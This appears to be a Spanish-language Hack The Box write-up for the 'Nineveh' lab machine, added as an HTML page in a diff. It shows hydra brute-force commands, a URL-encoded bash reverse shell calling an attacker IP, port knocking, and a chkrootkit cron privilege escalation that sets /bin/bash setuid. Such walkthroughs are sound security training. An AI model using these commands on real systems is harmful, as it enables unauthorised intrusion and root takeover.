@@ -1,0 +1,151 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Nineveh HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/nineveh/pasted-20260414121010.png" alt="Nineveh HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Nineveh</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>procesos</span>
+            <span>procmon</span>
+            <span>cron</span>
+            <span>chkrootkit</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Servicios web en puertos 80 y 443</li>
+            <li><code>Explotación</code>: Imagen en HTTPS contiene una <code>id_rsa</code> extraíble con <code>strings</code></li>
+            <li><code>Explotación</code>: phpLiteAdmin permite crear un fichero PHP usado después vía LFI</li>
+            <li><code>Movimiento lateral</code>: Servicio knockd abre SSH tras la secuencia correcta de puertos</li>
+            <li><code>Escalada de Privilegios</code>: Cron ejecuta chkrootkit vulnerable y permite ejecutar <code>/tmp/update</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414140757.png" alt="Nineveh HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: 443 Imagen con id_rsa</h2>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414140602.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414140647.png" alt="Nineveh HTB" />
+          <div class="code-card">
+            <h3>Leer cadenas legibles de la imagen</h3>
+            <pre><code>strings nineveh.png</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414140733.png" alt="Nineveh HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: 443 Base de datos</h2>
+          <div class="code-card">
+            <h3>Fuerza Bruta</h3>
+            <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.20.121 https-post-form "/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password." -t 50
+# Password -&gt; password123</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414141027.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414141944.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414141818.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414141913.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414142101.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414142219.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414142445.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414142458.png" alt="Nineveh HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: 80 LFI</h2>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414143345.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414143432.png" alt="Nineveh HTB" />
+          <div class="code-card">
+            <h3>Fuerza Bruta</h3>
+            <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.20.121 http-post-form "/department/login.php:username=admin&amp;password=^PASS^:Invalid password" -t 50
+# Credenciales -&gt; admin:1q2w3e4r5t</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414143943.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414144324.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414144434.png" alt="Nineveh HTB" />
+          <div class="code-card">
+            <h3>Bash en Web Encodeando &amp;</h3>
+            <pre><code>bash -c "bash -i &gt;%26 /dev/tcp/10.10.16.178/443 0&gt;%261"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414144740.png" alt="Nineveh HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <div class="code-card">
+            <h3>Enumerar puertos</h3>
+            <pre><code>netstat -tuln localhost</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414145558.png" alt="Nineveh HTB" />
+          <div class="code-card">
+            <h3>Enumerar procesos</h3>
+            <pre><code>ps -eo user,command</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414145951.png" alt="Nineveh HTB" />
+          <div class="code-card">
+            <h3>Configuración del servicios knockd</h3>
+            <pre><code>cat /etc/knockd.conf</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414150049.png" alt="Nineveh HTB" />
+          <div class="code-card">
+            <h3>Abrir puerto 22 pegandole con knock</h3>
+            <pre><code>knock 10.129.20.121 571:tcp 290:tcp 911:tcp</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414150433.png" alt="Nineveh HTB" />
+          <div class="code-card">
+            <h3>Acceso con la id_rsa de la imagen de la web en 443</h3>
+            <pre><code>chmod 600 id_rsa
+ssh -i id_rsa amrois@10.129.20.121</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Enumerar procesos</h3>
+            <pre><code>bash procmon.sh</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414161210.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414161255.png" alt="Nineveh HTB" />
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414162337.png" alt="Nineveh HTB" />
+          <div class="code-card">
+            <h3>Interpretar</h3>
+            <pre><code># Crea el fichero /tmp/update
+# Agrega el payload: #!/bin/sh\n chmod u+s /bin/bash
+chmod +x /tmp/update
+# Esperar que se vuelva a ejecutar chkrootkit
+bash -p</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/nineveh/pasted-20260414162518.png" alt="Nineveh HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>procesos</span>
+            <span>procmon</span>
+            <span>cron</span>
+            <span>chkrootkit</span>
+            <span>LFI</span>
+            <span>phpLiteAdmin</span>
+            <span>hydra</span>
+            <span>knock</span>
+            <span>imagen</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
